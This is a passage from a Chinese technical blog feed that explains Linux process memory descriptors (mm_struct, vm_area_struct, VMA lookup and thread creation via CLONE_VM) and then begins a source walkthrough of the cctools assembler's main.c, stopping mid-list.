class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* reserved for Red Hat */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __GENKSYMS__</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rh_reserved[<span class="number">2</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">/* How many tasks sharing this mm are OOM_DISABLE */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> rh_reserved_aux;</span><br><span class="line">        <span class="type">atomic_t</span> oom_disable_count;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* base of lib map area (ASCII armour) */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> shlib_base;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​mm_struct 结构体描述的是该进程的整个空间布局信息。下面列了一些字段的补充说明：</p><ul><li><code>pgd_t * pgd;</code>：Linux 采用多级段页式管理，该字段存放进程的页目录基地址（物理地址），即一级页表的物理地址，当进程被调度时，该字段内容会被加载进 CR3 寄存器（Page Directory Base Address Register–页目录基址寄存器）参与后续页表运算。整个运算过程当然由 MMU 硬件支持。</li></ul><p>  <img src="https://s2.loli.net/2023/01/11/uGrPJ4tlTNjh8A5.jpg" alt="0230111113831.jpg"></p><ul><li><code>unsigned long start_code, end_code, start_data, end_data...;</code> ：这几个值的范围就表示该进程对应段的空间范围。例如，代码段位于 [start_code, end_code)。</li></ul><p>​前面提到 mm_struct 结构体描述的是该进程的整个空间布局信息，而整个空间由许多段组成，例如 .text ，.data，某块被 malloc() 申请的堆内存等等，不同段的属性，权限，范围等各不相同，那如何描述每一个段的信息呢？答案就是： vm_area_struct 结构体，其定义于 <code>&lt;linux\mm_types.h&gt;</code>下，简称 VMA ，也被称为进程地址空间或进程线性区，是 Linux 虚存管理的最基本的管理单元。它描述的是一段连续的、具有相同访问属性的虚拟内存空间，大小为物理内存页面的整数倍。</p><p>​线性区的组织方式有两种，其一是链表形式，mm_struct 里的 <code>struct vm_area_struct * mmap; </code> 便是指向该首块 VMA 区域的指针，而在 vm_area_struct 结构体中有 <code> struct vm_area_struct* vm_next, * vm_prev;</code>指向该 VMA 链表的前后节点，链表的组织形式更利于遍历操作。其二是红黑树的组织方式，当线性区映射的块很多时，使用红黑树更方便于查找，mm_struct 里的 <code>struct rb_root mm_rb;</code> 便是该红黑树的根节点，而在 vm_area_struct 里的 <code>struct rb_node vm_rb;</code> 便是该红黑树的节点。</p><p>​值得注意的是，尽管有链表和红黑树两种组织方式，但并不代表内存中有两份副本，而是数据结构体实现两个域指针而已，在某个 vm_area_struct 结构体被创建之后便会插入到 mm-&gt;mm_rb 红黑树和 mm-&gt;mmap 链表中。</p><p><img src="https://s2.loli.net/2023/01/05/Df15butgM4ThmoW.png" alt="image.png"></p><p>​此外，还有在 mm_struct 里还有一个一个 <code>struct vm_area_struct * mmap_cache; /* last find_vma result */</code> 指针，这是由于程序的局部性原理，该指针指向最近使用的内存区域，因此使用 find_vma() 函数查找 vma 时，会首先从 mmap_cache 中找，找到了就直接返回。这种 mmap_cache 的命中率通常有35%-50%，当然之后内核开发者又在此基础上，提出了更高效的查找方案，感兴趣可以去自行了解一下 ~</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* mmap_cache 中查找节点*/</span></span><br><span class="line">vma = mm-&gt;mmap_cache;    </span><br><span class="line"><span class="keyword">if</span> (vma &amp;&amp; vma-&gt;vm_end &gt; addr &amp;&amp; vma-&gt;vm_start &lt;= addr)</span><br><span class="line">    <span class="keyword">return</span> vma;</span><br><span class="line"><span class="comment">/* 如果没在 chache 里找到便去红黑树里寻找 */</span></span><br><span class="line">rb_node = mm-&gt;mm_rb.rb_node;    </span><br><span class="line">vma = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">while</span> (rb_node) &#123;        </span><br><span class="line">    vma_tmp = rb_entry(rb_node, <span class="keyword">struct</span> vm_area_struct, vm_rb);        </span><br><span class="line">    <span class="keyword">if</span> (vma_tmp-&gt;vm_end &gt; addr) &#123;            </span><br><span class="line">        vma = vma_tmp;            </span><br><span class="line">        <span class="keyword">if</span> (vma_tmp-&gt;vm_start &lt;= addr)                </span><br><span class="line">            <span class="keyword">break</span>;            </span><br><span class="line">        rb_node = rb_node-&gt;rb_left;        </span><br><span class="line">    &#125; <span class="keyword">else</span>            </span><br><span class="line">        rb_node = rb_node-&gt;rb_right;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (vma)        </span><br><span class="line">        mm-&gt;mmap_cache = vma;    </span><br><span class="line"><span class="keyword">return</span> vma;</span><br></pre></td></tr></table></figure><p>​以下是便是线性区 vm_area_struct 结构体实现代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span></span></span><br><span class="line"><span class="class">&#123;</span>                                                                                                                                             <span class="comment">/***反向链表， 指向线性区所在的内存描述符。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span> <span class="comment">/* The address space we belong to. */</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**线性区范围可以表示为 [vm_start, vm_end) ，他们都是 4KB对齐的地址*/</span></span><br><span class="line">    <span class="comment">/*** 线性区内的首地址。*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vm_start; <span class="comment">/* Our start address within vm_mm. */</span>  </span><br><span class="line">    <span class="comment">/*** 线性区的末地址。*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vm_end; <span class="comment">/* The first byte after our end addresswithin vm_mm. linked list of VM areas per task, sorted by address */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/***链表组织形式 * vm_next, * vm_prev 分别VMA链表的前后成员。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span>* <span class="title">vm_next</span>, * <span class="title">vm_prev</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/***红黑树组织形式， 用于红黑树的数据。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span> <span class="comment">/** For areas with an address space and backing store,* linkage into the address_space-&gt;i_mmap prio tree, or* linkage to the list of like vmas hanging off its node, or* linkage of vma in the address_space-&gt;i_mmap_nonlinear list.*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*  rb_subtree_gap保存本node中左右子树中最大的gap，也就是最大间隙size。换句话说，从这个node开始，左右子树中能插入的VMA最大length是多少。*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rb_subtree_gap;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*** 线性区中页框的访问许可权，用于创建区域中各页目录、页表项和存取控制标志，如R/W, U/S, A, D, G位等。*/</span></span><br><span class="line">    <span class="comment">/* 一个vma可能由许多的虚拟 pages（页表） 组成，每个虚拟page需要经过page table的转换才能找到对应的物理页面。PTE中的Read/Write位是由软件设置的，设置依据就是这个page所属的vma，因此一个vma设置的VM_READ/VM_WRITE属性会复制到这个vma所含pages的PTE中，这样就形成了页表的访问权限。*/</span></span><br><span class="line">    <span class="type">pgprot_t</span> vm_page_prot; <span class="comment">/* Access permissions of this VMA. */</span>                                                                             </span><br><span class="line">    <span class="comment">/*** 线性区的标志。*/</span></span><br><span class="line">    <span class="comment">/* 例如 VM_READ 页是可读的，VM_SHARED 页可以被多个进程共享 ，VM_GROWSDOWN 这个区间可以向低地址扩展。等等*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vm_flags; <span class="comment">/* Flags, listed below. */</span>   </span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span> <span class="comment">/*** 如果在优先搜索树中，存在两个节点的基索引、堆索引、大小索引完全相同，那么这些相同的节点会被链接到一个链表，而vm_set就是这个链表的元素。*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">            <span class="type">void</span> *parent; <span class="comment">/* aligns with prio_tree_node parent */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">head</span>;</span></span><br><span class="line">        &#125; vm_set; <span class="comment">/*** 如果是文件映射，那么prio_tree_node用于将线性区插入到优先搜索树中。作为搜索树的一个节点。*/</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">raw_prio_tree_node</span> <span class="title">prio_tree_node</span>;</span></span><br><span class="line">    &#125; shared; <span class="comment">/** A file&#x27;s MAP_PRIVATE vma can be in both i_mmap tree and anon_vma* list, after a COW of one of the file pages.  A MAP_SHARED vma* can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack* or brk vma (with NULL file) can only be in an anon_vma list.*/</span> <span class="comment">/*** 指向匿名线性区链表的指针(参见&quot;映射页的反映射&quot;)。* 页框结构有一个anon_vma指针，指向该页的第一个线性区，随后的线性区通过此字段链接起来。* 通过此字段，可以将线性区链接到此链表中。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_node</span>;</span> <span class="comment">/* Serialized by anon_vma-&gt;lock */</span>                                                                                                                                                                                                              <span class="comment">/*** 指向anon_vma数据结构的指针(参见&quot;映射页的反映射&quot;)。此指针也存放在页结构的mapping字段中。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span> <span class="comment">/* Serialized by page_table_lock */</span> <span class="comment">/* Function pointers to deal with this struct. */</span>                                                                                                                                                                <span class="comment">/*** 指向线性区的方法。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span> <span class="comment">/* Information about our backing store: */</span>                                                                                                                                                                                                 <span class="comment">/*** 在映射文件中的偏移量(以页为单位)。对匿名页，它等于0或vm_start/PAGE_SIZE*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vm_pgoff; <span class="comment">/* Offset (within vm_file) in PAGE_SIZEunits, *not* PAGE_CACHE_SIZE */</span>                                                                                                                                                                                  <span class="comment">/*** 指向映射文件的文件对象(如果有的话)*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">vm_file</span>;</span> <span class="comment">/* File we map to (can be NULL). */</span>                                                                                                                                                                                                                       <span class="comment">/*** 指向内存区的私有数据。*/</span></span><br><span class="line">    <span class="type">void</span> *vm_private_data; <span class="comment">/* was vm_pte (shared mem) */</span>                                                                                                                                                                                                                            <span class="comment">/*** 释放非线性文件内存映射中的一个线性地址区间时使用。*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vm_truncate_count;   <span class="comment">/* truncate_count or restart_addr */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​我们通过 <code> cat /proc/PID/maps</code> 命令来查看某进程的所有 vma 在虚拟地址空间的分布情况，其内部实现靠的就是对 vm_area_struct 这个链表的遍历。</p><p><img src="https://s2.loli.net/2023/01/06/tGWFcAsurUDRB4e.png" alt="image.png"></p><p>​对 vma 的操作除了查找，还有增加和删除。加载一个动态链接库或者通过 mmap 创建映射时，都需要在进程地址空间中增加一个vma。具体过程是首先通过 get_unmapped_area() 找到虚拟地址空间中一块空闲且大小满足要求的区域，分配给新 vma 并设置其 flag 属性，并返回该 vma 起始处的虚拟地址。当然，你出于某种目的，也可以指定需要申请的地址（调用 mmap() 时指定参数 addr ），如果该地址正好是空的，就可以分配给你。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (addr) &#123;</span><br><span class="line">    addr = PAGE_ALIGN(addr);                 </span><br><span class="line">    vma = find_vma(mm, addr);                  </span><br><span class="line">    <span class="keyword">if</span> (TASK_SIZE -len &gt;= addr &amp;&amp;                      </span><br><span class="line">        (!vma || addr + len &lt;= vma-&gt;vm_start))                         </span><br><span class="line">            <span class="keyword">return</span> addr;              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​如果新建的 vma 和它地址上紧挨着的 vma 有相同的属性，且基于相同的映射对象（比如是同一个文件），则还会产生 vma 的合并。减少 vma 的数量有利于减轻内核的管理工作量，降低系统开销。如果没有发生合并，则需要调用 insert_vm_struct( ) 在vma 链表和 vma 红黑树中分别插入代表新 vma 的节点。但请注意，该函数分配的是虚拟空间的使用权，并不是分配的物理空间的使用权，对物理空间的分配执行如前文所说是写时分配的策略。最后，通过 munmap() 解除映射时，则需要在进程地址空间中删除对应的 vma ，并释放该 vma 占有的虚拟地址资源。</p><p>​总之，每一个进程描述符（即 task_struct 结构体）中都包含一个内存描述符（即 mm_struct 结构体），因此 current-&gt;mm 便指向当前进程的内存描述符。而创建子进程的 fork() 函数便是利用 copy_mm() 函数复制父进程的内存描述符，而子进程的 mm_struct 结构体则是通过文件 kernel&#x2F;fork.c 中的 allocate_mm() 宏从 mm_cachep slab分配器中分配得到的。通常，每个进程都有唯一的  mm_struct 结构体。</p><p>​如果父进程和子进程希望共享地址空间，可以在调用 clone() 函数的时候设置 CLONE_VM 标志，其实这就是 Linux 里的线程。（创建线程的 pthread_create() 函数和创建进程的 fork() 函数底层调用的都是 clone() 函数，只不过传进去的参数不一样导致创建出来的可以是子进程或者子线程。）</p><blockquote><p>在面试中很容易问到这个问题：进程和线程的区别是什么？对于该问题在网上有很多八股文式的答案:</p><ol><li>进程是资源分配的最小单位，线程是程序执行的最小单位（资源调度的最小单位）。</li><li>进程有自己的独立地址空间，每启动一个进程，系统就会为它分配地址空间，建立数据表来维护代码段、堆栈段和数据段，这种操作非常昂贵。<br>而线程是共享进程中的数据的，使用相同的地址空间，因此CPU切换一个线程的花费远比进程要小很多，同时创建一个线程的开销也比进程要小很多。</li><li>线程之间的通信更方便，同一进程下的线程共享全局变量、静态变量等数据，而进程之间的通信需要以通信的方式（IPC)进行。不过如何处理好同步与互斥是编写多线程程序的难点。</li><li>但是多进程程序更健壮，多线程程序只要有一个线程死掉，整个进程也死掉了，而一个进程死掉并不会对另外一个进程造成影响，因为进程有自己独立的地址空间。</li></ol><p>这样的回答虽然正确，但并没有能让面试官记住你的亮点，因为不够本质。后面我会单独写一章Linux进程和线程的区别，从源码的角度进行分析和解答，这样才能给面试官一个很不错的印象。</p></blockquote><p>​当 CLONE_VM 被指定后，内核便不在需要调用 allocate_mm() 函数，而是仅仅需要在调用 copy_mm() 函数中讲 mm 域指向其父进程的内存描述符即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clone_flags &amp; CLONE_VM)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">atomic_inc</span>(&amp;current-&gt;mm-&gt;mm_users);</span><br><span class="line">tsk-&gt;mm = current-&gt;mm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​下面这幅图总结一下各个数据结构之间的关系，家人们应该有比较清晰的了解了吧！</p><p><img src="https://s2.loli.net/2023/01/11/zr8pEgfcRhX4mIn.png" alt="PTFN__0BAAE_N_MQRR@D6C1.png"></p><p>​这就是关于Linux虚拟内存的一些故事了，那么，从下一章节就开始我们就要进入 malloc() 的源码了！</p><hr><h2 id="补充问答"><a href="#补充问答" class="headerlink" title="补充问答"></a>补充问答</h2><ol><li><code>pgd_t * pgd</code> 里 pgd 的值和 CR3 寄存器里的值一样的吗？ 答：参考。[linux - CR3值与pgd_t之间的差异](<a href="https://stackoom.com/question/3iezm">linux - CR3值与pgd_t之间的差异 - 堆栈内存溢出 (stackoom.com)</a>)</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cctools源码分析</title>
      <link href="/2022/12/05/G02_analy/"/>
      <url>/2022/12/05/G02_analy/</url>
      
        <content type="html"><![CDATA[<h1 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h1><h2 id="示例汇编文件"><a href="#示例汇编文件" class="headerlink" title="示例汇编文件"></a>示例汇编文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.global syscall</span><br><span class="line">syscall:</span><br><span class="line">mov %rdi, %rax</span><br><span class="line">mov %rsi, %rdi</span><br><span class="line">mov %rdx, %rsi</span><br><span class="line">mov %rcx, %rdx</span><br><span class="line">mov %r8, %rcx</span><br><span class="line">mov %r9, %r8</span><br><span class="line">mov 8(%rsp), %r9</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">mov (%rsp), %rdi</span><br><span class="line">lea 8(%rsp), %rsi</span><br><span class="line">call main</span><br><span class="line">mov %rax, %rdi</span><br><span class="line">mov $60, %eax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h2 id="函数一：read-asm-from-filepath-infile"><a href="#函数一：read-asm-from-filepath-infile" class="headerlink" title="函数一：read_asm_from_filepath(infile)"></a>函数一：read_asm_from_filepath(infile)</h2><blockquote><p>负责从源文件中读取所有汇编代码，返回一个Vector类型的指针。</p></blockquote><h4 id="调用read-entire-file-filepath"><a href="#调用read-entire-file-filepath" class="headerlink" title="调用read_entire_file(filepath);"></a>调用<a href="#read_entire_file(filepath);">read_entire_file(filepath);</a></h4><blockquote><p>src指针获得存放了所有源汇编文件字符的char ret[]数组地址。</p><p>如图为 解析到的*src值。</p><p><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221116010431245.png" alt="image-20221116010431245"></p></blockquote><h4 id="返回-read-all-asm-src-filepath-read-all-asm-src-filepath"><a href="#返回-read-all-asm-src-filepath-read-all-asm-src-filepath" class="headerlink" title="返回[read_all_asm(src, filepath);](#read_all_asm(src, filepath))"></a>返回[read_all_asm(src, filepath);](#read_all_asm(src, filepath))</h4><blockquote><p>该函数接收前面传来的源汇编文件字符的char ret[]数组地址，返回结构化之后的链表，类似于编译器中的TAC结构体链。并返回给上层调用函数 main.c。</p><p>这里返回的是一个Code_list链表，我们可以看到：这里的size其实就是汇编语句的条数。</p><p>​<img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221116011326465.png" alt="image-20221116011326465"><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221116012317434.png" alt="image-20221116012317434"></p><p>并且，从下一个处理该 Vector *code的函数也可以看到有一个关键的循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vector_size(code_list); i++)&#123;&#125;</span><br><span class="line"><span class="comment">//进入 vector_size(code_list)可以发现</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vector_size</span><span class="params">(Vector *vec)</span> &#123; <span class="keyword">return</span> vec-&gt;size; &#125;</span><br><span class="line">实际上就是我们之前提到的 size,该文件里为<span class="number">19.</span>与汇编源文件相符合。</span><br></pre></td></tr></table></figure></blockquote><h2 id="函数二：assemble-code-code"><a href="#函数二：assemble-code-code" class="headerlink" title="函数二：assemble_code(code);"></a>函数二：assemble_code(code);</h2><blockquote><p>接收结构化之后的汇编代码链表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjectImage *assemble_code(Vector *code) &#123; return assemble_code_detail(code); &#125;</span><br></pre></td></tr></table></figure></blockquote><h4 id="因此接下来分析-assemble-code-detail-Vector-code-list-ObjectImage-assemble-code-detail-Vector-code-list"><a href="#因此接下来分析-assemble-code-detail-Vector-code-list-ObjectImage-assemble-code-detail-Vector-code-list" class="headerlink" title="因此接下来分析[assemble_code_detail(Vector *code_list);](#ObjectImage *assemble_code_detail(Vector *code_list);)"></a>因此接下来分析[assemble_code_detail(Vector *code_list);](#ObjectImage *assemble_code_detail(Vector *code_list);)</h4><blockquote><p>返回之后主函数使用ObjectImage *obj &#x3D; assemble_code(code);来接收其返回值。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct ObjectImage &#123;</span><br><span class="line">    Vector *text;    // vector&lt;int&gt;</span><br><span class="line">    Vector *data;    // vector&lt;int&gt;</span><br><span class="line">    Vector *rela;    // vector&lt;RelaEntry *&gt;</span><br><span class="line">    Vector *strtab;  // vecotr&lt;int&gt;</span><br><span class="line">    Vector *symtab;  // vector&lt;SymbolInfo *&gt;</span><br><span class="line"></span><br><span class="line">    Map *symbol_map;    // map&lt;char *, SymbolInfo *&gt;</span><br><span class="line">    Map *label2offset;  // map&lt;char *, SectionOffset&gt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从调试信息来看，该结构体实际上记录了各个段的具体信息，以下是具体调试信息：</p><p>​<img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221109004948160.png" alt="image-20221109004948160"><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221109005027587.png" alt="image-20221109005027587"><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221109005053501.png" alt="image-20221109005053501"><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221109005127283.png" alt="image-20221109005127283"></p></blockquote><p>自此分析过程全部结束，下一步:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FILE *fh = fopen(outfile, &quot;wb&quot;);</span><br></pre></td></tr></table></figure><p>说明该往目标文件写二进制数据了。</p><h2 id="函数三：dump-object-image-obj-fh"><a href="#函数三：dump-object-image-obj-fh" class="headerlink" title="函数三：dump_object_image(obj, fh);"></a>函数三：dump_object_image(obj, fh);</h2><h4 id="分析-dump-object-image-obj-fh-dump-object-image-obj-fh"><a href="#分析-dump-object-image-obj-fh-dump-object-image-obj-fh" class="headerlink" title="分析[dump_object_image(obj, fh);](#dump_object_image(obj, fh);)"></a>分析[dump_object_image(obj, fh);](#dump_object_image(obj, fh);)</h4><h2 id="read-entire-file-filepath"><a href="#read-entire-file-filepath" class="headerlink" title="read_entire_file(filepath);"></a>read_entire_file(filepath);</h2><blockquote><p> 读入文件的主要函数.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while ((ch = fgetc(fh)) != EOF) string_builder_append(sb, ch);</span><br></pre></td></tr></table></figure><p>以上这一句是分析每一个char的语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int fgetc(FILE *stream)</span><br><span class="line">&#123;</span><br><span class="line">    char buf[1];</span><br><span class="line">    int res = read(stream-&gt;fd, buf, 1);</span><br><span class="line">    if (res &lt;= 0) return EOF;</span><br><span class="line">    return buf[0] &amp; 0xff;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在fgetc函数里面，通过read函数读入每一个字符，返回给buf[0]，然后取第八位传给while循环。</p><p>然后进入string_builder_append(sb, ch); 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">char string_builder_append(StringBuilder *sb, char ch)</span><br><span class="line">&#123;</span><br><span class="line">    vector_push_back(sb-&gt;data, (void *)ch);</span><br><span class="line">    return ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数主要操主调函数传下来的 StringBuilder *sb。</p><p>其中 sb-&gt;data里的size表示字符数。</p><p>返回 string_builder_get(sb); 该函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">char *string_builder_get(StringBuilder *sb)</span><br><span class="line">&#123;</span><br><span class="line">    int size = vector_size(sb-&gt;data);</span><br><span class="line">    char *ret = safe_malloc(size + 1);</span><br><span class="line">    for (int i = 0; i &lt; size; i++) ret[i] = (char)vector_get(sb-&gt;data, i);</span><br><span class="line">    ret[size] = &#x27;\0&#x27;;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数将采集到的所有字符放入 char ret[]数组中并返回主调函数。 </p><p>然后fclose源 .s文件</p><p>最后，该函数向上层主调函数返回了 char ret[]数组。</p><blockquote><p>&#x3D;&#x3D;自此：文件读入结束。&#x3D;&#x3D;</p></blockquote><h2 id="read-all-asm-src-filepath"><a href="#read-all-asm-src-filepath" class="headerlink" title="read_all_asm(src, filepath);"></a>read_all_asm(src, filepath);</h2><blockquote><p>传入参数：char ret[]数组，原汇编文件。返回Vector</p></blockquote><h4 id="init-source-src-filepath"><a href="#init-source-src-filepath" class="headerlink" title="init_source(src, filepath);"></a>init_source(src, filepath);</h4><p>该函数首先分析了文件路径 .&#x2F;system.s 存在一个 Source source; 结构体中（这是一个全局结构体）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    int line, column;</span><br><span class="line">    Vector *line2length;</span><br><span class="line">    char *src;// ==汇编代码==</span><br><span class="line">    // example: &quot;/tmp/1.c&quot; -&gt; cwd: &quot;/tmp/&quot;</span><br><span class="line">    char *cwd;  // current working directory with &#x27;/&#x27;</span><br><span class="line">    char *filepath;</span><br><span class="line">&#125; Source;</span><br></pre></td></tr></table></figure><p>接下来是一个大循环，每一个循环分析一个汇编语句，比如第一个循环是 .global，再比如 mov %rdi, %rax。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while (speekch() != &#x27;\0&#x27;) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>循环的第一部分是去掉类似注释的东西。</p></li><li><p>循环的第二部分是解析一个词语。分析char *str &#x3D; [read_asm_token();](# read_asm_token();)，返回比如 .global</p></li><li><p>接下来分析该词语的类别: 